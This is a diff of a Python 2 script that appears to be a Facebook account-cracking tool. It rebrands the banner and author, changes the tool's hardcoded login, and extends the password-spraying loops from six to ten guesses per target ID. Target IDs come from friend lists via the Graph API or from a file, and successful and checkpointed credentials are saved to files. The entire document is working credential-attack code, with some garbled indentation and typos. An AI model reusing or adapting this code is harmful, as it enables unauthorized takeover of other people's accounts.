@@ -25,19 +25,23 @@ reload(sys)
 sys.setdefaultencoding("utf8")
  
 logo = """
-\033[1;91m   ██████████  ██████████  █████████   ▀
-   ███    ███  ███    ███  ███   ███  ███ 
-   ███         ███    ███  ███   ███  ███ 
-   ██████████  ██████████  ███   ███  ███ 
-          ███  ███    ███  ███   ███  ███  
-   ███    ███  ███    ███  ███   ███  ███  
-   ██████████  ███    ███  ███   ███  ███ \033[1;36mQUEEN
-\033[1;97m══════════════════════════════════════════════
- [✓] Owner   : Sania Zahra x Shiffa Khan
- [✓] Github  : https://github.com/Stylish-Queen   
- [✓] Facebook: Jam Shahrukh Official
- [✓] don't pheel me:) hatterz make me famous 
-══════════════════════════════════════════════"""
+\033[1;92m    .S    .S_SSSs   SSS.        .SSS
+\033[1;92m   .SS  .SS~SSSSS   sSSS        SSSs
+\033[1;91m   S%S  S%S   SSSS  S%SSS      SSS%S
+\033[1;91m   S%S  S%S    S%S  S%S  SS  SS  S%S
+\033[1;97m   S&S  S%S•SSSS%S  S%S   s..s   S%S
+\033[1;97m   S&S  S&S  SSS%S  S&S    ss    S&S
+\033[1;94m   S&S  S&S    S&S  S&S          S&S
+\033[1;94m   S&S  S&S    S&S  S&S          S&S
+\033[1;93m   d*S  S*S    S&S  S*S          S*S
+\033[1;93m  .S*S  S*S    S*S  S*S          S*S
+\033[1;96msdSSS   S*S    S*S  S*S          S*S
+\033[1;96mYSSY    SSS    S*S  SSS          S*S
+\033[1;91m══════════════════════════════════════════════
+\033[1;97m➣ Author : Jam Shahrukh
+\033[1;97m➣ Github : https://github.com/jam
+\033[1;97m➣ Fb Page: Jam Shahrukh Official
+\033[1;91m══════════════════════════════════════════════"""
 idh = []
 back = 0
 
@@ -45,7 +49,7 @@ def tlogin():
 	os.system('clear')
 	print(logo)
 	username = raw_input("[+] TOOL USERNAME: ")
-	if username =="saniqueen":
+	if username =="jam":
 	    os.system('clear')
 	    print(logo)
 	    print "[✓] TOOL USERNAME: "+username+ " (correct)"
@@ -56,7 +60,7 @@ def tlogin():
 	    tlogin()
 	    
 	passw = raw_input("[+] TOOL PASSWORD: ")
-	if passw =="shiffakoji":
+	if passw =="687":
 	    os.system('clear')
 	    print(logo)
 	    print "[✓] TOOL USERNAME: " +username+ " (correct)"
@@ -177,9 +181,9 @@ def menu():
 	print(logo)
 	print("\t    \033[7m\033[1;32mUser: "+name+"\033[0;97m")
 	print("══════════════════════════════════════════════")
-	print("[1] Crack normal mode")
-	print("[2] Crack medium mode")
-	print("[3] Crack fast mode")
+	print("[1] Crack 10 pass mode")
+	print("[2] Crack 6 pass mode")
+	print("[3] Crack 2 pass mode")
 	print("[4] Create File")
 	print("[5] Extract Group Post Likes")
 	print("══════════════════════════════════════════════")
@@ -237,6 +241,10 @@ def crack_select():
 		pass4 = raw_input(" [4]Password: ")
 		pass5 = raw_input(" [5]Password: ")
 		pass6 = raw_input(" [6]Password: ")
+		pass7 = raw_input(" [7]Password: ")
+		pass8 = raw_input(" [8]Password: ")
+		pass9 = raw_input(" [9]Password: ")
+		pass10 = raw_input(" [10]Password: ")
 		idt = raw_input(" Input id: ")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
@@ -265,6 +273,10 @@ def crack_select():
 		pass4 = raw_input(" [4]Password: ")
 		pass5 = raw_input(" [5]Password: ")
 		pass6 = raw_input(" [6]Password: ")
+		pass7 = raw_input(" [7]Password: ")
+		pass8 = raw_input(" [8]Password: ")
+		pass9 = raw_input(" [9]Password: ")
+		pass10 = raw_input(" [10]Password: ")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
 			q = json.loads(r.text)
@@ -292,6 +304,10 @@ def crack_select():
 		pass4 = raw_input(" [4]Password: ")
 		pass5 = raw_input(" [5]Password: ")
 		pass6 = raw_input(" [6]Password: ")
+		pass7 = raw_input(" [7]Password: ")
+		pass8 = raw_input(" [8]Password: ")
+		pass9 = raw_input(" [9]Password: ")
+		pass10 = raw_input(" [10]Password: ")
 		try:
 			filelist = raw_input("[+] File : ")
 			for line in open(filelist , "r").readlines():
@@ -320,14 +336,14 @@ def crack_select():
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
-				print("\033[1;92m[Sania-Ok] "+uid+" | "+pass1)
+				print("\033[1;90m[Jam-Ok] "+uid+" | "+pass1)
 				ok = open("/sdcard/ids/Jam-Ok.txt", "a")
 				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error"]:
-					print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass1)
+					print("\033[1;97m[Jam-Cp] "+uid+" | "+pass1)
 					cp = open("/sdcard/ids/jam_cp.txt","a")
 					cp.write(uid+" | "+pass1+"\n")
 					cp.close()
@@ -337,14 +353,14 @@ def crack_select():
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
-						print("\033[1;92m[Sania-Ok] "+uid+" | "+pass2)
+						print("\033[1;90m[Jam-Ok] "+uid+" | "+pass2)
 						ok = open("/sdcard/ids/Jam-Ok.txt", "a")
 						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error"]:
-							print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass2)
+							print("\033[1;97m[Jam-Cp] "+uid+" | "+pass2)
 							cp = open("/sdcard/ids/jam_cp.txt","a")
 							cp.write(uid+" | "+pass2+"\n")
 							cp.close()
@@ -354,14 +370,14 @@ def crack_select():
 							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
-								print("\033[1;92m[Sania-Ok] "+uid+" | "+pass3)
+								print("\033[1;90m[Jam-Ok] "+uid+" | "+pass3)
 								ok = open("/sdcard/ids/Jam-Ok.txt", "a")
 								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error"]:
-									print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass3)
+									print("\033[1;97m[Jam-Cp] "+uid+" | "+pass3)
 									cp = open("/sdcard/ids/jam_cp.txt","a")
 									cp.write(uid+" | "+pass3+"\n")
 									cp.close()
@@ -370,14 +386,14 @@ def crack_select():
 									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
-										print("\033[1;92m[Sania-Ok] "+uid+" | "+pass4)
+										print("\033[1;90m[Jam-Ok] "+uid+" | "+pass4)
 										ok = open("/sdcard/ids/Jam-Ok.txt", "a")
 										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error"]:
-											print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass4)
+											print("\033[1;97m[Jam-Cp] "+uid+" | "+pass4)
 											cp = open("/sdcard/ids/jam_cp.txt","a")
 											cp.write(uid+" | "+pass4+"\n")
 											cp.close()
@@ -386,14 +402,14 @@ def crack_select():
 											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
 											q = json.loads(data)
 											if "loc" in q:
-												print("\033[1;92m[Sania-Ok] "+uid+" | "+pass5)
+												print("\033[1;90m[Jam-Ok] "+uid+" | "+pass5)
 												ok = open("/sdcard/ids/Jam-Ok.txt", "a")
 												ok.write(uid+" | "+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error"]:
-													print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass5)
+													print("\033[1;97m[Jam-Cp] "+uid+" | "+pass5)
 													cp = open("/sdcard/ids/jam_cp.txt","a")
 													cp.write(uid+" | "+pass5+"\n")
 													cp.close()
@@ -402,19 +418,82 @@ def crack_select():
 													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
 													q = json.loads(data)
 													if "loc" in q:
-														print("\033[1;92m[Sania-Ok] "+uid+" | "+pass6)
+														print("\033[1;90m[Jam-Ok] "+uid+" | "+pass6)
 														ok = open("/sdcard/ids/jam_ok.txt", "a")
 														ok.write(uid+" | "+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in q["error"]:
-															print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass6)
+															print("\033[1;97m[Jam-Cp] "+uid+" | "+pass6)
 															cp = open("/sdcard/ids/jam_cp.txt","a")
 															cp.write(uid+" | "+pass6+"\n")
 															cp.close()
 															cps.append(uid+pass6)
-																
+														else:
+													                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass7).text
+													                q = json.loads(data)
+													                if "loc" in q:
+														                print("\033[1;90m[Jam-Ok] "+uid+" | "+pass7)
+														                ok = open("/sdcard/ids/jam_ok.txt", "a")
+														                ok.write(uid+" | "+pass7+"\n")
+														                ok.close()
+														                oks.append(uid+pass7)
+													                else:
+														                if "www.facebook.com" in q["error"]:
+															                print("\033[1;97m[Jam-Cp] "+uid+" | "+pass7)
+															                cp = open("/sdcard/ids/jam_cp.txt","a")
+															                cp.write(uid+" | "+pass7+"\n")
+															                cp.close()
+															                cps.append(uid+pass7)
+																else:
+													                                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass8).text
+													                                q = json.loads(data)
+													                                if "loc" in q:
+														                                print("\033[1;90m[Jam-Ok] "+uid+" | "+pass8)
+														                                ok = open("/sdcard/ids/jam_ok.txt", "a")
+														                                ok.write(uid+" | "+pass8+"\n")
+														                                ok.close()
+														                                oks.append(uid+pass8)
+													                                else:
+														                                if "www.facebook.com" in q["error"]:
+															                                print("\033[1;97m[Jam-Cp] "+uid+" | "+pass8)
+															                                cp = open("/sdcard/ids/jam_cp.txt","a")
+															                                cp.write(uid+" | "+pass8+"\n")
+															                                cp.close()
+															                                cps.append(uid+pass8)
+																                else:
+													                                                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass9).text
+													                                                q = json.loads(data)
+													                                                if "loc" in q:
+														                                                print("\033[1;90m[Jam-Ok] "+uid+" | "+pass9)
+														                                                ok = open("/sdcard/ids/jam_ok.txt", "a")
+														                                                ok.write(uid+" | "+pass9+"\n")
+														                                                ok.close()
+														                                                oks.append(uid+pass9)
+													                                                else:
+														                                                if "www.facebook.com" in q["error"]:
+															                                                print("\033[1;97m[Jam-Cp] "+uid+" | "+pass9)
+															                                                cp = open("/sdcard/ids/jam_cp.txt","a")
+															                                                cp.write(uid+" | "+pass9+"\n")
+															                                                cp.close()
+															                                                cps.append(uid+pass9)
+																				else:
+													                                                                data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass10).text
+													                                                                q = json.loads(data)
+													                                                                if "loc" in q:
+														                                                                print("\033[1;90m[Jam-Ok] "+uid+" | "+pass10)
+														                                                                ok = open("/sdcard/ids/jam_ok.txt", "a")
+														                                                                ok.write(uid+" | "+pass10+"\n")
+														                                                                ok.close()
+														                                                                oks.append(uid+pass10)
+													                                                                else:
+														                                                                if "www.facebook.com" in q["error"]:
+															                                                        print("\033[1;97m[Jam-Cp] "+uid+" | "+pass10)
+															                                                        cp = open("/sdcard/ids/jam_cp.txt","a")
+															                                                        cp.write(uid+" | "+pass10+"\n")
+															                                                        cp.close()
+															                                                        cps.append(uid+pass10)
 		except:
 			pass
 	
@@ -549,8 +628,10 @@ def choice_select():
 		print("══════════════════════════════════════════════")
 		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                 p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-		pass3 = raw_input(" [3]Password: ")
+		p3 = raw_input(' \033[1;92m[3]Name + digit: ')
 		pass4 = raw_input(" [4]Password: ")
+		pass5 = raw_input(" [5]Password: ")
+		pass6 = raw_input(" [6]Password: ")
 		idt = raw_input(" Input id: ")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
@@ -575,8 +656,10 @@ def choice_select():
 		print("══════════════════════════════════════════════")
 		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                 p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-		pass3 = raw_input(" [3]Password: ")
+		p3 = raw_input(' \033[1;92m[3]Name + digit: ')
 		pass4 = raw_input(" [4]Password: ")
+		pass5 = raw_input(" [5]Password: ")
+		pass6 = raw_input(" [6]Password: ")
 		idt = raw_input(" Input id: ")
 		try:
 			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
@@ -601,8 +684,10 @@ def choice_select():
 		print("══════════════════════════════════════════════")
 		p1 = raw_input(' \033[1;92m[1]Name + digit: ')
                 p2 = raw_input(' \033[1;92m[2]Name + digit: ')
-		pass3 = raw_input(" [3]Password: ")
+		p3 = raw_input(' \033[1;92m[3]Name + digit: ')
 		pass4 = raw_input(" [4]Password: ")
+		pass5 = raw_input(" [5]Password: ")
+		pass6 = raw_input(" [6]Password: ")
 		filelist = raw_input(" Input file: ")
 		try:
 			for line in open(filelist , "r").readlines():
@@ -631,14 +716,14 @@ def choice_select():
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
-				print("\033[1;92m[Sania-Ok] "+uid+" | "+pass1)
+				print("\033[1;90m[Jam-Ok] "+uid+" | "+pass1)
 				ok = open("/sdcard/ids/sdcard/ids/jam_ok.txt", "a")
 				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error"]:
-					print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass1)
+					print("\033[1;97m[Jam-Cp] "+uid+" | "+pass1)
 					cp = open("/sdcard/ids/jam_cp.txt","a")
 					cp.write(uid+" | "+pass1+"\n")
 					cp.close()
@@ -648,30 +733,31 @@ def choice_select():
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
-						print("\033[1;92m[Sania-Ok] "+uid+" | "+pass2)
+						print("\033[1;90m[Jam-Ok] "+uid+" | "+pass2)
 						ok = open("/sdcard/ids/jam_ok.txt", "a")
 						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error"]:
-							print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass2)
+							print("\033[1;97m[Jam-Cp] "+uid+" | "+pass2)
 							cp = open("/sdcard/ids/jam_cp.txt","a")
 							cp.write(uid+" | "+pass2+"\n")
 							cp.close()
 							cps.append(uid+pass2)
 						else:
+							pass3 = name.lower() + p3
 							data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass3, headers=header).text
 							q = json.loads(data)
 							if "loc" in q:
-								print("\033[1;92m[Sania-Ok] "+uid+" | "+pass3)
+								print("\033[1;90m[Jam-Ok] "+uid+" | "+pass3)
 								ok = open("/sdcard/ids/jam_ok.txt", "a")
 								ok.write(uid+" | "+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error"]:
-									print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass3)
+									print("\033[1;97m[Jam-Cp] "+uid+" | "+pass3)
 									cp = open("/sdcard/ids/jam_cp.txt","a")
 									cp.write(uid+" | "+pass3+"\n")
 									cp.close()
@@ -680,18 +766,50 @@ def choice_select():
 									data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass4, headers=header).text
 									q = json.loads(data)
 									if "loc" in q:
-										print("\033[1;92m[Sania-Ok] "+uid+" | "+pass4)
+										print("\033[1;90m[Jam-Ok] "+uid+" | "+pass4)
 										ok = open("/sdcard/ids/jam_ok.txt", "a")
 										ok.write(uid+" | "+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error"]:
-											print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass4)
+											print("\033[1;97m[Jam-Cp] "+uid+" | "+pass4)
 											cp = open("/sdcard/ids/jam_cp.txt","a")
 											cp.write(uid+" | "+pass4+"\n")
 											cp.close()
 											cps.apppend(uid+pass4)
+										else:
+											data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass5, headers=header).text
+											q = json.loads(data)
+											if "loc" in q:
+												print("\033[1;90m[Jam-Ok] "+uid+" | "+pass5)
+												ok = open("/sdcard/ids/Jam-Ok.txt", "a")
+												ok.write(uid+" | "+pass5+"\n")
+												ok.close()
+												oks.append(uid+pass5)
+											else:
+												if "www.facebook.com" in q["error"]:
+													print("\033[1;97m[Jam-Cp] "+uid+" | "+pass5)
+													cp = open("/sdcard/ids/jam_cp.txt","a")
+													cp.write(uid+" | "+pass5+"\n")
+													cp.close()
+													cps.append(uid+pass5)
+												else:
+													data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass6).text
+													q = json.loads(data)
+													if "loc" in q:
+														print("\033[1;90m[Jam-Ok] "+uid+" | "+pass6)
+														ok = open("/sdcard/ids/jam_ok.txt", "a")
+														ok.write(uid+" | "+pass6+"\n")
+														ok.close()
+														oks.append(uid+pass6)
+													else:
+														if "www.facebook.com" in q["error"]:
+															print("\033[1;97m[Jam-Cp] "+uid+" | "+pass6)
+															cp = open("/sdcard/ids/jam_cp.txt","a")
+															cp.write(uid+" | "+pass6+"\n")
+															cp.close()
+															cps.append(uid+pass6)
 
 																
 		except:
@@ -813,14 +931,14 @@ def choice_select_jam():
 			data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass1, headers=header).text
 			q = json.loads(data)
 			if "loc" in q:
-				print("\033[1;92m[Sania-Ok] "+uid+" | "+pass1)
+				print("\033[1;90m[Jam-Ok] "+uid+" | "+pass1)
 				ok = open("/sdcard/ids/sdcard/ids/jam_ok.txt", "a")
 				ok.write(uid+" | "+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error"]:
-					print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass1)
+					print("\033[1;97m[Jam-Cp] "+uid+" | "+pass1)
 					cp = open("/sdcard/ids/jam_cp.txt","a")
 					cp.write(uid+" | "+pass1+"\n")
 					cp.close()
@@ -829,14 +947,14 @@ def choice_select_jam():
 					data = requests.get("http://localhost:5000/auth?id="+uid+"&pass="+pass2, headers=header).text
 					q = json.loads(data)
 					if "loc" in q:
-						print("\033[1;92m[Sania-Ok] "+uid+" | "+pass2)
+						print("\033[1;90m[Jam-Ok] "+uid+" | "+pass2)
 						ok = open("/sdcard/ids/jam_ok.txt", "a")
 						ok.write(uid+" | "+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error"]:
-							print("\033[1;90m[Shifa-Cp] "+uid+" | "+pass2)
+							print("\033[1;97m[Jam-Cp] "+uid+" | "+pass2)
 							cp = open("/sdcard/ids/jam_cp.txt","a")
 							cp.write(uid+" | "+pass2+"\n")
 							cp.close()
